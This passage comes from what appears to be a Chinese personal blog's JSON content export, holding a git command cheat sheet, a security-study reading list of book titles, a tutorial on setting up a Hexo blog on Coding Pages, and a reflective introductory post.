[tag] HEAD --pretty=format:%s 6.显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件 $ git log [tag] HEAD --grep feature 7.显示某个文件的版本历史，包括文件改名 $ git log --follow [file] $ git whatchanged [file] 8.显示指定文件相关的每一次diff $ git log -p [file] 9.显示过去5次提交 $ git log -5 --pretty --oneline 10.显示所有提交过的用户，按提交次数排序 $ git shortlog -sn 11.显示指定文件是什么人在什么时间修改过 $ git blame [file] 12.显示暂存区和工作区的差异 $ git diff 13.显示暂存区和上一个commit的差异 $ git diff --cached [file] 14.显示工作区与当前分支最新commit之间的差异 $ git diff HEAD 15.显示两次提交之间的差异 $ git diff [first-branch]...[second-branch] 16.显示今天你写了多少行代码 $ git diff --shortstat &quot;@{0 day ago}&quot; 17.显示某次提交的元数据和内容变化 $ git show [commit] 18.显示某次提交发生变化的文件 $ git show --name-only [commit] 19.显示某次提交时，某个文件的内容 $ git show [commit]:[filename] 20.显示当前分支的最近几次提交 $ git reflog 0X08 远程同步篇1.下载远程仓库的所有变动 $ git fetch [remote] 2.显示所有远程仓库 $ git remote -v 3.显示某个远程仓库的信息 $ git remote show [remote] 4.增加一个新的远程仓库，并命名 $ git remote add [shortname] [url] 5.取回远程仓库的变化，并与本地分支合并 $ git pull [remote] [branch] 6.上传本地指定分支到远程仓库 $ git push [remote] [branch] 7.强行推送当前分支到远程仓库，即使有冲突 $ git push [remote] --force 8.推送所有分支到远程仓库 $ git push [remote] --all 0X09 时光回溯篇1.恢复暂存区的指定文件到工作区 $ git checkout [file] 2.恢复某个commit的指定文件到暂存区和工作区 $ git checkout [commit] [file] 3.恢复暂存区的所有文件到工作区 $ git checkout . 4.重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 $ git reset [file] 5.重置暂存区与工作区，与上一次commit保持一致 $ git reset --hard 6.重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 $ git reset [commit] 7.重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 $ git reset --hard [commit] 8.重置当前HEAD为指定commit，但保持暂存区和工作区不变 $ git reset --keep [commit] 9.新建一个commit，用来撤销指定commit，后者的所有变化都将被前者抵消，并且应用到当前分支 $ git revert [commit] 10.暂时将未提交的变化移除，稍后再移入 $ git stash $ git stash pop 1X00 Github与信仰这个周目是关于Linux下git时光机的实际应用 - 把已有项目推到Github上。 Github账号的创建与git的安装配置不再作说明。 1X01 设置Git设置用户名与email： git config --global user.name &quot;your name&quot; git config --global user.email &quot;youremail@lalala.com&quot; 此时在/home下会新建一个.gitconfig文件 1X02 配置SSH1.创建SSH Key $ ssh-keygen -t rsa -C &quot;youremail@lalala.com&quot; 系统会提示key的保存位置，一般为~/.ssh，接下来会请求输入口令，一路默认，敲三次回车即可。 然后登陆gayhub -&gt; Accounting settings -&gt; SSH key -&gt; Add SSH Key -&gt; 取个容易区分的名字 -&gt; 把~/.ssh/id_rsa.pub文件中的内容粘贴上去即可。 用下面的命令进行测试： ssh -T git@github.com 1X03 push and pull from github1.在新建的~/My_Message_Board目录中git clone已存在GitHub上的Repository git clone URL 2.先修改个readme，提交。 sudo vi README.md git status git add README.md git status git commit -m &quot;Cyris readme-change 5/17&quot; git status git remote add origin URL 报了个错： fatal: remote origin already exists. 解决方法： $ git remote rm origin 再来。 $ git remote add origin URL（这些URL都是github里复制的URL） 3.下面把它push上去 $ git push -u origin master 这里会要求输入GitHub账户的用户名和密码。输入即可。 4.提交完成，去GitHub看眼Repository。内容修改成功。","tags":[{"name":"git","slug":"git","permalink":"https://icyris.github.io/tags/git/"},{"name":"wiki","slug":"wiki","permalink":"https://icyris.github.io/tags/wiki/"}]},{"title":"魔法禁书目录","date":"2017-04-15T01:38:00.000Z","path":"2017/04/15/wiki/","text":"这里是一份推荐书单，各个方向各个阶段均有，由VidarTeam整理。感谢。 推荐图书目录渗透方向：· 基础类&#160; &#160; &#160; &#160;《PHP基础教程.第4版》&#160; &#160; &#160; &#160;《PHP与MySQL权威指南》&#160; &#160; &#160; &#160;《Javascript权威指南》&#160; &#160; &#160; &#160;《Python基础教程》&#160; &#160; &#160; &#160;《Python 网络编程》&#160; &#160; &#160; &#160;《TCP/IP协议详解 三卷》&#160; &#160; &#160; &#160;《图解TCP/IP》&#160; &#160; &#160; &#160;《HTTP权威指南》&#160; &#160; &#160; &#160;《图解HTTP》&#160; &#160; &#160; &#160;《HTTP协议详解》&#160; &#160; &#160; &#160;《Python绝技：运用Python成为顶级黑客》 · 攻防类&#160; &#160; &#160; &#160;《白帽子讲WEB安全》&#160; &#160; &#160; &#160;《Web前端 黑客技术揭秘》&#160; &#160; &#160; &#160;《Kali Linux Web 渗透测试》&#160; &#160; &#160; &#160;《黑客攻防技术宝典Web实战篇》&#160; &#160; &#160; &#160;《SQL注入攻击与防御》&#160; &#160; &#160; &#160;《XSS跨站脚本攻击剖析与防御》&#160; &#160; &#160; &#160;《安全参考系列》&#160; &#160; &#160; &#160;《Python黑帽子：黑客与渗透测试编程之道》 逆向方向：· 基础类（建议按顺序学习）&#160; &#160; &#160; &#160;《汇编语言》&#160; &#160; &#160; &#160;《汇编语言编程艺术》&#160; &#160; &#160; &#160;《Windows环境下32位汇编语言程序设计-琢石成器 第3版》&#160; &#160; &#160; &#160;《WINDOWSPE权威指南》&#160; &#160; &#160; &#160;《C++反汇编与逆向分析技术揭秘》&#160; &#160; &#160; &#160;《Windows程序设计》&#160; &#160; &#160; &#160;《逆向工程实战》&#160; &#160; &#160; &#160;《逆向工程核心原理 》&#160; &#160; &#160; &#160;《逆向工程揭密/安全技术大系中文版》&#160; &#160; &#160; &#160;《Malware analyst’s cookbook》&#160; &#160; &#160; &#160;《Python灰帽子：黑客与逆向工程师的Python编程之道》 · 进阶类&#160; &#160; &#160; &#160;《加密与解密》&#160; &#160; &#160; &#160;《Windows PE权威指南》&#160; &#160; &#160; &#160;《恶意代码分析实战》&#160; &#160; &#160; &#160;《0day安全软件漏洞分析技术》&#160; &#160; &#160; &#160;《数据结构》（严蔚敏著） Android 方向：· 开发&#160; &#160; &#160; &#160;《疯狂JAVA讲义》&#160; &#160; &#160; &#160;《疯狂Android讲义》&#160; &#160; &#160; &#160;《第一行代码-Android》&#160; &#160; &#160; &#160;《Android移动开发一本就够了》&#160; &#160; &#160; &#160;《Android基础教程》&#160; &#160; &#160; &#160;《Android C++ 高级编程-使用NDK》&#160; &#160; &#160; &#160;《Android驱动开发权威指南》&#160; &#160; &#160; &#160;《Android软件安全与逆向分析》&#160; &#160; &#160; &#160;《深入理解Android II卷》&#160; &#160; &#160; &#160;《Android安全攻防实战》 Windows&amp;Linux 方向：&#160; &#160; &#160; &#160;《Windows程序设计》&#160; &#160; &#160; &#160;《Windows核心编程》&#160; &#160; &#160; &#160;《寒江独钓Windows内核安全编程》&#160; &#160; &#160; &#160;《鸟哥的linux私房菜基础篇+服务器篇》&#160; &#160; &#160; &#160;《Linux内核精髓》&#160; &#160; &#160; &#160;《深入理解LINUX内核》 网络方向：&#160; &#160; &#160; &#160;《思科网络技术学院教程CCNA Exploration: 网络基础知识》&#160; &#160; &#160; &#160;《思科 网络技术学院教程CCNA Exploration:路由协议和概念》&#160; &#160; &#160; &#160;《图解TCP/IP》&#160; &#160; &#160; &#160;《计算机网络》（Andrew S.Tanenbaum著）&#160; &#160; &#160; &#160;《Wireshark数据包分析实战》&#160; &#160; &#160; &#160;《网络分析技术揭秘》 无线电安全方向：&#160; &#160; &#160; &#160;《无线网络安全攻防实战进阶》&#160; &#160; &#160; &#160;《无线电安全攻防大揭秘》&#160; &#160; &#160; &#160;《射频识别(RFID)核心技术详解》&#160; &#160; &#160; &#160;《黑客大曝光：无线网络安全》&#160; &#160; &#160; &#160;《BackTrack 5 Wireless Penetration Testing Beginner’s Guide》 &#160; &#160; &#160; &#160;文章：（因为图书比较少，遂从某大佬处Get一些比较好的案例分析）&#160; &#160; &#160; &#160;《RFID Hacking ④ : ProxMark3 破解门禁》&#160; &#160; &#160; &#160;《RFID Hacking ③ : ProxMark3 使用案例：嗅探银行闪付卡信息》&#160; &#160; &#160; &#160;《HackRF嗅探蓝牙重放iBeacons信号》&#160; &#160; &#160; &#160;《永不消逝的电波（三）：低功耗蓝牙（BLE）入门之如何调戏别人的小米手环》&#160; &#160; &#160; &#160;《Mousejack Hacking : 利用MouseJack进行物理攻击浅析》&#160; &#160; &#160; &#160;《MouseJack Hacking 测试指南》&#160; &#160; &#160; &#160;《BLE Hacking：使用Ubertoothone扫描嗅探低功耗蓝牙》&#160; &#160; &#160; &#160;《RFID Hacking – 资源大合集》 新技术（容器、云、机器学习相关）：· Docker&#160; &#160; &#160; &#160;《第一本Docker书》&#160; &#160; &#160; &#160;《Docker入门实战》&#160; &#160; &#160; &#160;《Docker容器与容器云》&#160; &#160; &#160; &#160;《Docker开发实践》 · 机器学习&#160; &#160; &#160; &#160;《机器学习》&#160; &#160; &#160; &#160;《深入浅出数据分析》&#160; &#160; &#160; &#160;《啤酒与尿布》&#160; &#160; &#160; &#160;《集体智慧编程》&#160; &#160; &#160; &#160;《统计学习方法》 · 云计算&#160; &#160; &#160; &#160;《云计算：概念、技术与架构》&#160; &#160; &#160; &#160;《深入理解云计算：基本原理和应用程序编程技术》&#160; &#160; &#160; &#160;《云数据中心构建实战：核心技术、运维管理、安全与高可用》&#160; &#160; &#160; &#160;《云计算核心技术剖析》&#160; &#160; &#160; &#160;《实战Hadoop》 另外附上协会wiki","tags":[{"name":"wiki","slug":"wiki","permalink":"https://icyris.github.io/tags/wiki/"},{"name":"一些书","slug":"一些书","permalink":"https://icyris.github.io/tags/一些书/"}]},{"title":"Windows下利用Hexo+Coding搭建静态博客","date":"2017-04-05T08:13:35.000Z","path":"2017/04/05/hexo-blog/","text":"按照粉学姐和土土的教程搭了两三天，终于做成了这个静态博客。本文将介绍如何用Hexo+Coding搭建Blog。这里附上粉学姐的教程和土土的教程,部分语句直接引用原文。 Hexo的安装安装gitgit选择适合自己系统的git下载安装，我选择的windows。 安装node.jsnode.js这里我选择的是V6.10.2 LFS，可以根据自己的系统选择合适的版本安装。 安装HEXO打开安装好的Git Bash，键入： npm install -g hexo 然后把Hexo更新到最新版本，键入： npm update hexo -g 部署Hexo这里创建一个名为hexo的文件夹，用来放置博客文件，然后在hexo文件夹内右键Git Bash，键入： $ hexo init 然后，hexo会自动在这个文件夹里生成你建立网站的所有文件。到这里我们已经搭建起本地的博客了，执行以下命令，同样在hexo文件夹下右键Git Bash输入以下命令： $ hexo g $ hexo s 然后在浏览器输入 http://localhost:4000 可以看到当前博客效果。（最初的模板不是很耐看，我们会在后面说明更换主题。）我们需要把博客部署在网络上，这样别人才看得到。Hexo博客只支持ie8以上的浏览器。 配置CodingCoding是国内的网站，不用担心被墙的问题。 注册CodingCoding官网 添加项目登陆之后，新建一个空项目，名字和自己的ID一致。 配置SSH密钥1.在桌面右键Bit Bash，然后键入： $ cd ~/. ssh 如果提示：No such file or directory 说明你是第一次使用Git，请直接跳到第三步。 2.如果不是第一次使用，执行下面的操作，然后跳到第四步： 1. $ mkdir key_backup 2. $ cp id_rsa* key_backup 3. $ rm id_rsa* 3.生成密钥，键入:（把邮箱改成自己邮箱地址） ssh-keygen -t rsa -C &quot;YOUR_EMAIL@YOUREMAIL.COM&quot; 生成过程中会让你输入passphrase口令，可以直接回车，以后出现都是空密码。 1. $ ssh-keygen -t rsa -C &quot;YOUR_EMAIL@YOUREMAIL.COM&quot; 2. Generating public/private rsa key pair. 3. Enter passphrase (empty for no passphrase): 4. Enter same passphrase again: 5. Your identification has been saved in /c/Users/USERNAME/.ssh/id_rsa. 6. Your public key has been saved in /c/Users/USERNAME/.ssh/id_rsa.pub. 7. The key fingerprint is: 8. 15:81:d2:7a:c6:6c:0f:ec:b0:b6:d4:18:b8:d1:41:48 YOUR_EMAIL@YOUREMAIL.COM 4.生成密钥后，在目录找到私钥 id_rsa 和公钥 id_rsa.pub 这两个文件。千万不要把私钥文件 id_rsa 透露给任何人。否则别人可以以管理员身份登录你的blog。 5.在coding中添加ssh使用文本工具打开id_rsa.pub,复制里面的所有内容。进入coding-&gt;项目-&gt;进入项目-&gt;左侧设置-&gt;部署公钥-&gt;新建部署公钥，公钥名称随意，在SSH-RSA公钥内容文本框中，把刚才复制的东西全部粘贴进去，然后添加。 6.在桌面右键Git Bash，测试是否可以连接到服务器。 ssh -T git@git.coding.net 如果是第一次链接，会出现以下警告： 1. The authenticity of host &apos;git.coding.com (50.116.2.223)&apos; can&apos;t be established. 2. #RSA key fingerprint is 84:9e:c9:8e:7f:36:28:08:7e:13:bf:43:12:74:11:4e. 3. #Are you sure you want to continue connecting (yes/no)? 直接输入yes，然后会提示输入passphrase，如果刚才是空密码，那么直接回车过去就好。 如果出现下面的字符，就说明成功了： Hi USERNAME! You&apos;ve successfully authenticated, but GitCafe does not provide shell access. 设置GIT账户信息在桌面右键Git Bash，键入： 1. $ git config --global user.name &quot;yourname&quot; //coding上的用户名 2. $ git config --global user.email &quot;yourmaill@yourmaili.com&quot; //填写自己的邮箱 添加Pages目录如果直接上传，上传上去的只是所谓的博客源码，如果我们要让我们博客显示出来，就要建立pages目录。 打开hexo文件夹，右键Git Bash，然后键入： 1. echo &apos;Hello, world&apos; &gt; index.html 2. git init 3. git add . 4. git commit -a -m &apos;Hello, world!&apos; 5. git remote add origin git@git.coding.net:Cyris/Cyris.git //把这里的Cyris替换成自己的id 6. git checkout -b coding-pages 7. git push origin coding-pages 完成上面的操作，在coding的项目界面便会出现coding-pages的分支，然后进入分支界面，把默认分支改为coding-pages，删除原默认分支。 配置Hexo的配置文件_config.yml配置好Hexo和coding之后，我们需要把两者联系在一起。用编辑器打开_config.yml文件（推荐sublime），打开之后把最后的deploy改为： 1. deploy: 2. type: git 3. repository: git@git.coding.net:Cyris/Cyris.git 4. branch: coding-pages 这里使用的是nodo.js语法，这种语法对格式的要求相当高，：后必须跟上空格，不然会报错，请严格按照格式来写。 开启Coding-Pages服务登录Coding，点进项目 -&gt; 代码 -&gt; Pages服务 -&gt; 开启服务 绑定自定义域名在Coding服务页，可以输入自己的域名，然后点击添加域名绑定。然后在你的域名管理页面添加一个CNAME记录，将他指向coding-pages：cyris.coding.me，然后保存。 完成配置在Hexo目录右键Git Bash，键入： 1. hexo g 2. hexo d 每次修改自己的任何配置文件，或者新建了博文，都必须输入这两个指令上传！ 如果出现报错： ERROR Deployer not found: git 解决方法： npm install hexo-deployer-git --save 如果没有爆出错误，说明配置成功，可以打开xxx.git.coding.net(xxx为自己的id)查看自己的博客主页。如果报错，请检查前面的配置有没有错误，如果找不到错误，请参见Hexo的常见报错. Hexo的优化Hexo提供了一个默认主题，我们可以在官方网址寻找我们自己喜欢的主题。这是我的主题yilia 挑选好主题之后，在hexo目录下Git Bash，键入： $ git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 在Hexo目录下，修改_config.yml里的项目 theme: yilia 然后在hexo目录下键入: hexo g 每一个主题和主题的名字都有不同，但大部分主题，都会提供详细的书写方式。 加入多说评论系统1.注册多说2.创建新项目，shortname用你的ID小写由于博主主题只带多说评论系统插件，这里不多解释，只需要在hexo\\themes\\yilia下打开_config.yml，修改 duoshuo: Cyris 关于统计，打赏系统可以注册百度站长平台，里面有详细的使用方法。 其他1.如果想要修改边框，头像，边栏超链接地址，这个一般因不同的主题而异，所以不好详述，详细要参阅对应的官方文档。 2.其实hexo还能添加很多不同的插件，博主修为尚浅，所以就不写出不清楚的插件用法，这里贴上一些别人的博客。Hexo的优化与定制 Hexo的使用我们终于搭好了自己的Blog，却发现并没有“写博客”的功能。 常用命令1. hexo new &quot;postName&quot; #新建文章 2. hexo new page &quot;pageName&quot; #新建页面 3. hexo g #生成静态页面至public目录 4. hexo s #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） 5. hexo d #将.deploy目录部署到coding 1.第一个命令也就是最常用的命令，postname可以替换为我们想要的文章名，文章名方便记忆就好，只是在书写的时候我们能够区分就可以了，别人是看不到的。 2.第二个命令比较复杂，但是如果仅仅是写博文的话，第二个是用不到的。 3.3,5命令就不用多解释了，每次写完博文，都需要这两个命令上传。 Markdowm语法当我们输入命令，新建了一个文章，我们发现在hexo文件夹下source/_posts下生成了一个md文件，md文件是什么呢？我们首先得了解Markdown语法。（本人用Markdownpad编辑器） .md文章头部1. title: postName #文章页面上的显示名称，可以任意修改，不会出现在URL中 2. date: 2017-04-05 15:30:16 #文章生成时间，一般不改，当然也可以任意修改 3. categories: 4. - example #分类,多个分类依次 5. tags: 6. - tag1 #文章标签，可空，多标签请用格式，注意:后面有个空格 7. description: #附加一段文章摘要，字数最好在140字以内。 8. --- 贴上Markdown语法 关于本地图片和所属路径的问题当我们想使用我们自己的本地图片的时候，我们会纠结一件事，就是我们该把文件放在哪？路径又该怎么引用，我来解释下这个问题： 1.当我们编辑好我们的博文的时候，我们输入指令hexo g ，会自动生成所对应的html页面添加到hexo文件夹下的public，然后上传public，所以public便是我们的主目录。 2.但是我们发现public内的东西是修改不了的，所以本地图片不能存放在public中，所以我们要把图片放在source中，在source中新建img文件夹，然后建对应博文的文件夹，放置所属的图片，这样当我们需要引用本地图片的时候，则输入这样的路径(/img/Hexo_Blogs/1.png),然后我们就发现，图片没有问题了。 写在后面的折腾了好久，搭完的时候还是很开心的（这些静态博客党），也算是完成了一个长久以来的心愿，也希望阅读的人在看完这篇教程后能够学会搭建一个自己的小空间。 再次感谢粉学姐和土土的教程，侵删。 以上。","tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://icyris.github.io/tags/Hexo/"}]},{"title":"写在前面的","date":"2017-04-04T08:19:49.000Z","path":"2017/04/04/acaleph/","text":"绿生 干净·深刻·精致 这是那一刻的绿生， 所带给我的欣喜。 一些话&#160; &#160; &#160; &#160;一直有搭一个个人博客的想法，现在终于做了起来。花了点时间，却也很开心。这里是Cyris的个人小站，他和阅读这篇文字的你们一样，经历和思考着这些那些。前几天和Ak师傅聊了聊，有了些新的想法，也有了下面的这些话。 &#160; &#160; &#160; &#160;有事想做的兴奋存一点也不错，干干净净地着手做起来也很棒。把日子过得精致即可。这份精致，也是对生活的一种自信。“我们读诗写诗，非为它的灵巧，我们读诗写诗，因为我们是人类的一员。而人类充满了热情”，对我来说，最有魅力的，还是那些拥有自己的热情的人。这里想提提Acaleph，Aklis以及蔡师傅。 &#160; &#160; &#160; &#160;蔡师傅是位地理教师，喜欢穿衬衫，卷袖子。他的课，一卷书，一张嘴，一幅画。他总能很流畅而优美地解释一些枯燥的东西，知识也好，做人也好，很是亲和。夏天吃完午饭，可以看到他靠着阳光在车里睡觉，这对于匆匆赶路的准备高考的我们来说，再棒不过。留点时间给自己。他也普通，也会抱怨，也会醉酒，也会点着烟，即使如此，他的烟味并非毫无营养，并熏染了一片人。他经历了很多我们所不能承受的东西，却也过得安和。某天有幸在路上遇到他，问，要去哪里呢，他说，去看看夫人，就在那边的餐馆里，刚开业，会忙。这让我想起来某节课上，他说，今天女儿要回来，雨大，我想就上半节课，去机场接接她。话后，教室很是安静，这半节课大家听得也很是用心。拍肩是个很简单的动作，但却感动了Cyris很久。平静却深刻的东西，最让人记忆。 &#160; &#160; &#160; &#160;在面试以后就没有和Ak师傅聊过了，中间也去过几次协会，那时候刚起步学C和Python，也不知道怎么和满屋的dalao们交流，Ak说，是这样的。很久没聊了，有空过来聊聊吧。有幸遇到Ak师傅。协会的新生测试后又和他聊了聊，讲了讲从开发到学习linux和渗透等方面的东西，虽然只是一个晚上，但Cyris对下面所要做的事，更清晰了点，这站博客，只是第一步。Ak师傅影响Cyris的地方在哪呢？Acaleph说过一句话，大概是，二十岁的人去玩三岁的时候想玩的玩具就没有意义了。Ak师傅可以把知识玩起来。在早先的培训中，他在讲知识的时候，Cyris从他的眼睛里看到了一种很稀有的成分。玩也是一种艺术，能把想玩的东西玩好的人，很棒。Ak说，探求真理者不可心存傲慢。共勉。 &#160; &#160; &#160; &#160;首先感谢Acaleph能让Cyris放纵喜欢，从起初的“可以说话的人”到现在各个领域的陪伴，很开心。最早见面的时候Cyris说，她就像早晨四五点的天空，虽然还没有看到具体的光亮，但那种色彩的欲出，让人兴奋不已，并开始期待着这一天，并开始期待着下一天。她有着一份优雅。Cyris很喜欢一句话，“抬头做人，低头做事”，我觉得她正是这样的一个人。她的喜欢与不喜欢很清晰，想要什么很明确，并能很努力地去尝试摘到它。我一直被一些自己不是很喜欢的理念束缚着，比如也会有没写完作业就没什么心情看自己喜欢的书什么的情况，这些都在慢慢改变。时间有限，能多做一点喜欢的事情，挺好。但这也不是一种逃脱的借口，所谓优秀，大概是最快速而质量地完成“其他任务”并精心投入到自己想完成的事中去吧ovo。愿我们都能成为我们所想成为的人。 关于我&#160; &#160; &#160; &#160;web，linux，渗透初学者，偶尔也会在站内发布一些噪音。很喜欢一些有创造力的，听着舒服的音乐，喜欢提琴与钢琴，喜欢动漫。有什么有趣的想法或者想探讨的问题，欢迎左转邮箱/知乎联系Cyris。这里绿生的小站，为久行的心，提供一棵树，一杯水，以及勺子与西瓜QVQ &#160; &#160; &#160; &#160;对啦，文虽不华，知识尚浅，如需转载或引用，还请注明链接与作者呐，感谢。 &#160; &#160; &#160; &#160;以上。","tags":[{"name":"樱花","slug":"樱花","permalink":"https://icyris.github.io/tags/樱花/"},{"name":"绿生","slug":"绿生","permalink":"https://icyris.github.io/tags/绿生/"}]}]